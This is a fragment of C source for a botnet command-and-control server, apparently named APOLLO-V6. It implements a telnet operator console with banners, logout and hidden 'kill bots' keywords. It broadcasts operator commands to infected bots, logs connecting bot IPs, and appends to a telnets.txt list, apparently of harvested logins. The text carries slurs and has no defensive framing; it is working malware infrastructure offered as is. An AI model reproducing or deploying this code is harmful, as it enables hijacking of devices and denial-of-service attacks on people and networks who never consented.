				if(send(thefd, extraline2,  strlen(extraline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline3,  strlen(extraline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline4,  strlen(extraline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline5,  strlen(extraline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline6,  strlen(extraline6),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				if(send(thefd, "\x1b[1;31m~> \x1b[36m", 13, MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
	    if(strstr(buf, "CLEAR")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9, strlen(line9), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
     	}
		if(strstr(buf, "clear")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9, strlen(line9), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
     	}
        if(strstr(buf, "LOGOUT")) 
	    {  
 		  sprintf(botnet, "Peace Mr %s\r\n", accounts[find_line].username, buf);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		  goto end;
		}
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "GTFOFAG")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
				}
     			trim(buf);
                if(send(thefd, "\x1b[1;31m~> \x1b[36m", 13, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].username, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].username, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:
                managements[thefd].connected = 0;
                close(thefd);
                OperatorsConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {       printf("New BOTNET Connection From: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("Connections.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], char **sock)
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
				fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
				sleep(5);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		if (file_exist("MODZ.txt"))
		{
			printf("\x1b[35mThe botnet has been screened you may now connect\n");
		} else {
			printf("\x1b[37mMake A File Named MODZ.txt with your logins retard\n");
			sleep(5);
			exit (EXIT_FAILURE);
		}
        telFD = fopen("telnets.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "APOLLO-V6");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}